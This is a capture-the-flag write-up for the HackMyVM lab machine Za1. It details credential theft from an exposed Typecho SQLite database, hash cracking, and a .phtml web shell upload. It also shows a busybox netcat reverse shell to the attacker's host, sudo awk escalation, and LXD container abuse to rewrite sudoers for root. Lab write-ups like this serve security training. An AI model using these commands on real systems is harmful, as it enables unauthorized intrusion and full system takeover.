# Za1

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Za1 | Zacarx007 | Beginner | HackMyVM |

**Summary:** Za1 presents a multi-stage exploitation chain targeting a Typecho blogging platform running on a Debian Linux system. The engagement begins with reconnaissance of a publicly exposed Typecho CMS instance, where directory enumeration reveals an improperly protected database file accessible under the `/usr/` directory path. Extraction of user credential hashes from the SQLite database, specifically the phpass password hashes from the `typechousers` table, yields administrative credentials through dictionary-based cracking. Following authentication bypass, an arbitrary file upload vulnerability is exploited by modifying CMS settings to permit PHP extension uploads; the attacker constructs and uploads a PHP web shell with the `.phtml` extension to bypass file type restrictions. Remote command execution through the shell enables reverse shell establishment with `busybox netcat`, granting initial foothold as the `www-data` web server user. Privilege escalation to the unprivileged user `za_1` leverages a misconfigured sudo rule permitting passwordless execution of `/usr/bin/awk` without argument restrictions; the GTFObin technique executing a shell spawn within `awk` circumvents the intended access controls. Final privilege escalation to root exploits the user's membership in the LXD container group: compilation of an Alpine Linux container image, import into LXD with a mounted root filesystem, and execution of a privileged shell within the container context allows direct file system modification, enabling sudoers file tampering to grant permanent root access without credentials.

---

## Reconnaissance

### Network Discovery

The assessment commenced with network scanning to identify active virtual hosts within the designated network segment. The scanning utility discovered a VirtualBox instance at IP address `192.168.100.171`:

```powershell
PS D:\hackmyvm\machines> D:\CTF_Tools\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.171 08:00:27:92:1D:8B VirtualBox
```

### Service Enumeration

With the target IP identified, initial HTTP service reconnaissance was performed by establishing a variable for subsequent command execution:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/za1]
└─$ ip=192.168.100.171 && url=http://$ip
```

A curl request against the target revealed an active HTTP service hosting a Typecho blog platform. The HTML response header metadata disclosed version information and virtual host requirements:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/za1]
└─$ curl -s $url
<!DOCTYPE HTML>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="renderer" content="webkit">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <title>Zacarx's blog</title>

    <!-- 使用url函数转换相关路径 -->
    <link rel="stylesheet" href="http://za1.hmv/usr/themes/default/normalize.css">
    <link rel="stylesheet" href="http://za1.hmv/usr/themes/default/grid.css">
    <link rel="stylesheet" href="http://za1.hmv/usr/themes/default/style.css">

    <!-- 通过自有函数输出HTML头部信息 -->
    <meta name="description" content="a nice blog" />
<meta name="keywords" content="typecho,php,blog" />
<meta name="generator" content="Typecho 1.2.1" />
<meta name="template" content="default" />
<link rel="pingback" href="http://192.168.100.171/index.php/action/xmlrpc" />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://192.168.100.171/index.php/action/xmlrpc?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://192.168.100.171/index.php/action/xmlrpc?wlw" />
<link rel="alternate" type="application/rss+xml" title="Zacarx's blog &raquo; RSS 2.0" href="http://192.168.100.171/index.php/feed/" />
<link rel="alternate" type="application/rdf+xml" title="Zacarx's blog &raquo; RSS 1.0" href="http://192.168.100.171/index.php/feed/rss/" />
<link rel="alternate" type="application/atom+xml" title="Zacarx's blog &raquo; ATOM 1.0" href="http://192.168.100.171/index.php/feed/atom/" />
</head>
<body>

<header id="header" class="clearfix">
    <div class="container">
        <div class="row">
            <div class="site-name col-mb-12 col-9">
                                    <a id="logo" href="http://za1.hmv/">Zacarx's blog</a>
                    <p class="description">a nice blog</p>
                            </div>
            <div class="site-search col-3 kit-hidden-tb">
                <form id="search" method="post" action="http://za1.hmv/" role="search">
                    <label for="s" class="sr-only">搜索关键字</label>
                    <input type="text" id="s" name="s" class="text" placeholder="输入关键字搜索"/>
                    <button type="submit" class="submit">搜索</button>
                </form>
            </div>
            <div class="col-mb-12">
                <nav id="nav-menu" class="clearfix" role="navigation">
                    <a class="current"                        href="http://za1.hmv/">首页</a>
                                                                 <a                            href="http://192.168.100.171/index.php/start-page.html"
                            title="关于">关于</a>
                                    </nav>
            </div>
        </div><!-- end .row -->
    </div>
</header><!-- end #header -->
<div id="body">
    <div class="container">
        <div class="row">




<div class="col-mb-12 col-8" id="main" role="main">
            <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
            <h2 class="post-title" itemprop="name headline">
                <a itemprop="url"
                   href="http://192.168.100.171/index.php/archives/1/"> 热爱生命</a>
            </h2>
            <ul class="post-meta">
                <li itemprop="author" itemscope itemtype="http://schema.org/Person">作者: <a
                        itemprop="name" href="http://192.168.100.171/index.php/author/1/"
                        rel="author">zacarx</a></li>
                <li>时间:                     <time datetime="2023-07-26T16:41:00+00:00" itemprop="datePublished">2023-07-26</time>
                </li>
                <li>分类: <a href="http://192.168.100.171/index.php/category/default/">默认分类</a></li>
                <li itemprop="interactionCount">
                    <a itemprop="discussionUrl"
                       href="http://192.168.100.171/index.php/archives/1/#comments">1 条评论</a>
                </li>
            </ul>
            <div class="post-content" itemprop="articleBody">
                <p>我不去想，</p><p>是否能够成功 ，</p><p>既然选择了远方 ，</p><p>便只顾风雨兼程。</p><p>我不去想，</p><p>能否赢得爱情 ，</p><p>既然钟情于玫瑰 ，</p><p>就勇敢地吐露真诚 。</p><p>我不去想，</p><p>身后会不会袭来寒风冷雨 ，</p><p>既然目标是地平线，</p><p>留给世界的只能是背影 。</p><p>我不去想，</p><p>未来是平坦还是泥泞 ，</p><p>只要热爱生命 ，</p><p>一切，都在意料之中。</p>            </div>
        </article>

    </div><!-- end #main-->

<div class="col-mb-12 col-offset-1 col-3 kit-hidden-tb" id="secondary" role="complementary">
            <section class="widget">
            <h3 class="widget-title">最新文章</h3>
            <ul class="widget-list">
                <li><a href="http://192.168.100.171/index.php/archives/1/"> 热爱生命</a></li>            </ul>
        </section>

            <section class="widget">
            <h3 class="widget-title">最近回复</h3>
            <ul class="widget-list">
                                                     <li>
                        <a href="http://192.168.100.171/index.php/archives/1/#comment-1">Typecho</a>: 欢迎加入 Typecho 大家族                    </li>
                             </ul>
        </section>

            <section class="widget">
            <h3 class="widget-title">分类</h3>
            <ul class="widget-list"><li class="category-level-0 category-parent"><a href="http://192.168.100.171/index.php/category/default/">默认分类</a></li></ul>        </section>

            <section class="widget">
            <h3 class="widget-title">归档</h3>
            <ul class="widget-list">
                <li><a href="http://192.168.100.171/index.php/2023/07/">July 2023</a></li>            </ul>
        </section>

            <section class="widget">
            <h3 class="widget-title">其它</h3>
            <ul class="widget-list">
                                     <li class="last"><a href="http://192.168.100.171/admin/login.php">登录</a>
                     </li>
                                 <li><a href="http://192.168.100.171/index.php/feed/">文章 RSS</a></li>
                 <li><a href="http://192.168.100.171/index.php/feed/comments/">评论 RSS</a></li>
                 <li><a href="https://typecho.org">Typecho</a></li>
             </ul>
        </section>

</div><!-- end #sidebar -->

        </div><!-- end .row -->
    </div>
</div><!-- end #body -->

<footer id="footer" role="contentinfo">
    &copy; 2026 <a href="http://za1.hmv/">Zacarx's blog</a>.
    由 <a href="https://typecho.org">Typecho</a> 强力驱动.
</footer><!-- end #footer -->

</body>
</html>
```

The page source revealed references to a virtual host domain `za1.hmv`. This domain was added to the local hosts file for proper DNS resolution:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/za1]
└─$ echo '192.168.100.171 za1.hmv' | sudo tee -a /etc/hosts
[sudo] password for ouba:
192.168.100.171 za1.hmv
```

### Blog Interface

The blog interface rendered successfully after DNS resolution was established:

![](image.png)

### Directory Enumeration

Gobuster was employed to identify additional web endpoints and accessible resources on the target server:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/za1]
└─$ gobuster dir -u $url -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.171
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 318] [--> http://192.168.100.171/admin/]
/install              (Status: 301) [Size: 320] [--> http://192.168.100.171/install/]
/sql                  (Status: 301) [Size: 301] [--> http://192.168.100.171/sql/]
/var                  (Status: 301) [Size: 316] [--> http://192.168.100.171/var/]
/usr                  (Status: 301) [Size: 316] [--> http://192.168.100.171/usr/]
/server-status        (Status: 403) [Size: 280]
Progress: 220557 / 220557 (100.00%)
===============================================================
Finished
===============================================================
```

The enumeration successfully identified several interesting directories, most notably `/usr/` which typically should not be web-accessible. This represents a significant configuration oversight.

---

## Initial Access

### Database Discovery and Extraction

Browsing to the `/usr/` directory revealed directory listing capabilities with visible database files:

![](image-1.png)

A database file named `64c0dcaf26f51.db` was identified and downloaded directly through the web interface:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/za1]
└─$ wget $url/usr/64c0dcaf26f51.db
--2026-04-14 12:33:46--  http://192.168.100.171/usr/64c0dcaf26f51.db
Connecting to 192.168.100.171:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 102400 (100K)
Saving to: '64c0dcaf26f51.db'

64c0dcaf26f51.db          100%[==================================>] 100.00K  --.-KB/s    in 0.1s

2026-04-14 12:33:46 (697 KB/s) - '64c0dcaf26f51.db' saved [102400/102400]
```

### Credential Extraction from Database

The SQLite database was opened locally for examination:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/za1]
└─$ sqlite3 64c0dcaf26f51.db
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
typechocomments       typechometas          typechousers
typechocontents       typechooptions
typechofields         typechorelationships
sqlite> select * from typechousers;
1|zacarx|$P$BhtuFbhEVoGBElFj8n2HXUwtq5qiMR.|zacarx@qq.com|http://www.zacarx.com|zacarx|1690361071|1692694072|1690364323|administrator|9ceb10d83b32879076c132c6b6712318
2|admin|$P$BERw7FPX6NWOVdTHpxON5aaj8VGMFs0|admin@11.com||admin|1690364171|1776144560|1690365357|administrator|32d753b679a0eb0d7bc9af007d0346e0
```

The `typechousers` table contained two user accounts with phpass password hashes. The `admin` account hash `$P$BERw7FPX6NWOVdTHpxON5aaj8VGMFs0` was the primary target for credential recovery.

### Password Cracking

The phpass hash was cracked using John the Ripper with the rockyou wordlist:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/za1]
└─$ john -w=/usr/share/wordlists/rockyou.txt hashes
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
123456           (admin)
```

The password for the `admin` account was recovered as `123456`. This credential enabled authentication to the Typecho administrative panel.

### Arbitrary File Upload Vulnerability

After logging into the administrative interface with recovered credentials, the blog post editor was accessed:

![](image-2.png)

An attempt to upload a PHP web shell with a `.phtml` extension was made. However, the CMS enforced file extension restrictions:

![](image-3.png)

The CMS settings in the administration panel options section was examined. The `options-general` configuration allowed modification of permitted upload file extensions:

![](image-4.png)

After adjusting the settings to permit `.phtml` uploads, the PHP web shell was successfully uploaded:

```bash
http://za1.hmv/usr/uploads/2026/04/1092100433.phtml
```

The uploaded shell location was confirmed through the CMS interface:

![](image-5.png)

### Remote Command Execution

The web shell enabled arbitrary command execution on the target system. Initial commands confirmed the running environment:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/za1]
└─$ curl http://za1.hmv/usr/uploads/2026/04/1092100433.phtml?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/za1]
└─$ curl http://za1.hmv/usr/uploads/2026/04/1092100433.phtml?cmd=which%20busybox
/bin/busybox
```

### Reverse Shell Establishment

A reverse shell was initiated using busybox netcat. On the attacker machine, a netcat listener was established:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/za1]
└─$ nc -lvnp 4444
```

The target system was instructed to connect back to the attacker with a reverse shell through the web shell interface:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/za1]
└─$ curl http://za1.hmv/usr/uploads/2026/04/1092100433.phtml?cmd=busybox%20nc%20192.168.100.1%204444%20-e%20%2Fbin%2Fbash
```

The reverse connection was received:

```bash
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 50075
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@za_1:/var/www/html/usr/uploads/2026/04$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/za1]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

www-data@za_1:/var/www/html/usr/uploads/2026/04$ export SHELL=/bin/bash
www-data@za_1:/var/www/html/usr/uploads/2026/04$ export TERM=xterm
www-data@za_1:/var/www/html/usr/uploads/2026/04$ stty rows 75 cols 134
```

A stabilized TTY session was established with proper environment configuration. The shell now ran with full terminal capabilities.

---

## Privilege Escalation

### System Enumeration

Once the reverse shell was established, system reconnaissance was performed to identify available escalation vectors:

```bash
www-data@za_1:/$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
za_1:x:1000:1000:Zacarx:/home/za_1:/bin/bash
www-data@za_1:/$ ls -la /home
total 12
drwxr-xr-x  3 root root 4096 Jul 26  2023 .
drwxr-xr-x 24 root root 4096 Jul 26  2023 ..
drwxr-xr-x  6 za_1 za_1 4096 Aug 22  2023 za_1
www-data@za_1:/$ cd /home/za_1/
www-data@za_1:/home/za_1$ ls -la
total 44
drwxr-xr-x 6 za_1 za_1 4096 Aug 22  2023 .
drwxr-xr-x 3 root root 4096 Jul 26  2023 .
lrwxrwxrwx 1 za_1 za_1    9 Aug 22  2023 .bash_history -> /dev/null
-rw-r--r-- 1 za_1 za_1  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 za_1 za_1 3771 Apr  4  2018 .bashrc
drwx------ 2 za_1 za_1 4096 Jul 26  2023 .cache
drwx------ 3 za_1 za_1 4096 Jul 26  2023 .gnupg
-rw-r--r-- 1 za_1 za_1  807 Apr  4  2018 .profile
drwxr-xr-x 2 za_1 za_1 4096 Jul 26  2023 .root
drwx------ 2 za_1 za_1 4096 Jul 26  2023 .ssh
-rw-r--r-- 1 za_1 za_1    0 Jul 26  2023 .sudo_as_admin_successful
-rw------- 1 za_1 za_1  991 Jul 26  2023 .viminfo
-rw-r--r-- 1 za_1 za_1   23 Jul 26  2023 user.txt
```

The system contained a user account `za_1` with an empty `.sudo_as_admin_successful` marker file. Sudo capabilities were examined:

```bash
www-data@za_1:/home/za_1$ which sudo
/usr/bin/sudo
www-data@za_1:/home/za_1$ sudo -l
Matching Defaults entries for www-data on za_1:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on za_1:
    (za_1) NOPASSWD: /usr/bin/awk
```

The sudo configuration permitted the `www-data` user to execute `/usr/bin/awk` as user `za_1` without authentication. This misconfiguration lacked argument restrictions, enabling execution of arbitrary commands through awk's `system()` function.

### First Stage Privilege Escalation: www-data to za_1

The GTFObin technique for awk privilege escalation was exploited to spawn a shell with `za_1` user privileges:

![](image-6.png)

```bash
www-data@za_1:/home/za_1$ sudo -u za_1 /usr/bin/awk 'BEGIN {system("/bin/bash")}'
za_1@za_1:~$ id
uid=1000(za_1) gid=1000(za_1) groups=1000(za_1),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

Shell access was successfully obtained as user `za_1`. The group membership output revealed membership in the `lxd` group (GID 108), which represents a critical privilege escalation vector, as LXD group membership permits container creation and manipulation with escalated privileges.

### Second Stage Privilege Escalation: za_1 to root via LXD

The LXD privilege escalation technique requires an Alpine Linux container image. The image was prepared on the attacker machine using the lxd-alpine-builder tool. Initial dependencies were installed:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/za1]
└─$ sudo apt update && sudo apt install git-core build-essential -y
```

The lxd-alpine-builder repository was cloned:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/za1]
└─$ git clone https://github.com/saghul/lxd-alpine-builder.git
```

The Alpine image was compiled within the cloned repository:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/za1]
└─$ cd lxd-alpine-builder

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/za1/lxd-alpine-builder]
└─$ sudo ./build-alpine
```

After compilation completion, the artifacts were examined:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/za1/lxd-alpine-builder]
└─$ ls -la
total 7256
drwxr-xr-x 3 ouba ouba    4096 Apr 14 13:11 .
drwxr-xr-x 3 ouba ouba    4096 Apr 14 13:10 ..
-rw-r--r-- 1 ouba ouba 3259593 Apr 14 13:10 alpine-v3.13-x86_64-20210218_0139.tar.gz
-rw-r--r-- 1 root root 4113179 Apr 14 13:11 alpine-v3.23-x86_64-20260414_1311.tar.gz
-rwxr-xr-x 1 ouba ouba    8064 Apr 14 13:10 build-alpine
drwxr-xr-x 2 ouba ouba    4096 Apr 14 13:10 .git
-rw-r--r-- 1 ouba ouba   26530 Apr 14 13:10 LICENSE
-rw-r--r-- 1 ouba ouba   26530 Apr 14 13:10 README.md
```

The newly built image `alpine-v3.23-x86_64-20260414_1311.tar.gz` required ownership modification to ensure transferability:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/za1/lxd-alpine-builder]
└─$ sudo chown ouba:ouba alpine-v3.23-x86_64-20260414_1311.tar.gz
```

A Python HTTP server was started to transfer the container image to the target system:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/za1/lxd-alpine-builder]
└─$ python3 -m http.server 8080
```

On the target system, the Alpine image was downloaded through the established session:

```bash
za_1@za_1:/tmp$ wget http://192.168.100.1:8080/alpine-v3.23-x86_64-20260414_1311.tar.gz
--2026-04-14 06:12:23--  http://192.168.100.1:8080/alpine-v3.23-x86_64-20260414_1311.tar.gz
Connecting to 192.168.100.1:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4113179 (3.9M) [application/gzip]
Saving to: 'alpine-v3.23-x86_64-20260414_1311.tar.gz'

                 alpine-v3.23-x86   0%[                                                   alpine-v3.23-x86_64-20260414_1311 100%[===========================================================>]   3.92M  --.-KB/s    in 0.1s

2026-04-14 06:12:23 (33.6 MB/s) - 'alpine-v3.23-x86_64-20260414_1311.tar.gz' saved [4113179 bytes]
```

The transfer was confirmed through the server logs:

```bash
172.21.32.1 - - [14/Apr/2026 13:12:24] "GET /alpine-v3.23-x86_64-20260414_1311.tar.gz HTTP/1.1" 200 -
```

### LXD Container Configuration and Root Access

LXD was initialized on the target system with default configuration:

```bash
za_1@za_1:/tmp$ lxd init --auto
```

The Alpine image was imported with an alias for convenient reference:

```bash
za_1@za_1:/tmp$ lxc image import ./alpine-v3.23-x86_64-20260414_1311.tar.gz --alias myimage
Image imported with fingerprint: a19c050960d8a8f09efb7b600d6ea362b469633f2ac748db1ae214532095433f
za_1@za_1:/tmp$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| myimage | a19c050960d8 | no     | alpine v3.23 (20260414_13:11) | x86_64 | 3.92MB | Apr 14, 2026 at 6:15am (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
```

A container named `pwned` was created from the Alpine image with privileged security context enabled and the host root filesystem mounted at `/mnt/root`:

```bash
za_1@za_1:/tmp$ lxc init myimage pwned -c security.privileged=true
Creating pwned
za_1@za_1:/tmp$ lxc config device add pwned mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to pwned
za_1@za_1:/tmp$ lxc start pwned
za_1@za_1:/tmp$ lxc exec pwned /bin/sh
~ # id
uid=0(root) gid=0(root)
```

A shell with root privileges was obtained within the container context. With root access to the mounted host filesystem, the sudoers file was modified to grant permanent passwordless sudo access to user `za_1`:

```bash
~ # echo "za_1 ALL=(ALL) NOPASSWD:ALL" >> /mnt/root/etc/sudoers
~ # exit
```

### Root Shell Establishment

Upon exiting the container, the sudoers modification took effect. Root access was obtained through sudo:

```bash
za_1@za_1:/tmp$ sudo -l
Matching Defaults entries for za_1 on za_1:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User za_1 may run the following commands on za_1:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
```

```bash
za_1@za_1:/tmp$ sudo -i
root@za_1:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
za_1
```

### Flag Capture

Both user and root flags were recovered from their respective home directories:

```bash
root@za_1:~# cat /home/za_1/user.txt /root/root.txt
flag{Thu[REDACTED]}
flag{qq_[REDACTED]}
```

---

## Attack Chain Summary

1. **Reconnaissance**: Network scanning identified the target at `192.168.100.171`. HTTP service enumeration revealed a Typecho blog platform running at version 1.2.1, with source analysis disclosing the virtual host requirement for `za1.hmv`. Directory enumeration via gobuster identified multiple accessible paths including `/usr/`, `/admin/`, `/install/`, and `/sql/` endpoints.

2. **Vulnerability Discovery**: The `/usr/` directory exposed an SQLite database file `64c0dcaf26f51.db` through web-accessible directory listing. The database contained Typecho user credentials stored as phpass password hashes in the `typechousers` table. A dictionary attack against the `admin` user hash successfully recovered the password `123456`. The CMS file upload functionality could be reconfigured through administrative settings to permit arbitrary PHP file extensions, circumventing initial `.php` and `.phtml` blocking.

3. **Exploitation**: Administrative credentials were used to access the Typecho control panel. Upload restrictions were disabled through the settings interface to permit `.phtml` file uploads. A PHP web shell was uploaded to the publicly accessible `/usr/uploads/` directory path. Remote command execution through the shell was leveraged to establish a reverse shell connection to the attacker infrastructure using busybox netcat, achieving initial foothold as the `www-data` web server user.

4. **Internal Enumeration**: Within the reverse shell, sudo capabilities for user `www-data` were examined, revealing unrestricted permission to execute `/usr/bin/awk` as user `za_1` without password authentication. Group membership inspection for user `za_1` revealed membership in the `lxd` container management group, presenting a secondary privilege escalation vector. File system enumeration confirmed the existence of `/root/root.txt` flag file requiring root privileges for access.

5. **Privilege Escalation**: The awk GTFObin technique was exploited to spawn a shell with `za_1` user privileges through sudo execution without arguments. Subsequent escalation leveraged LXD group membership through container image preparation, deployment, and root filesystem mounting. A privileged Alpine Linux container was created with the host root filesystem accessible at `/mnt/root`, enabling modification of the sudoers file to grant permanent passwordless root access. Root shell was obtained through sudo invocation following the sudoers file modification.

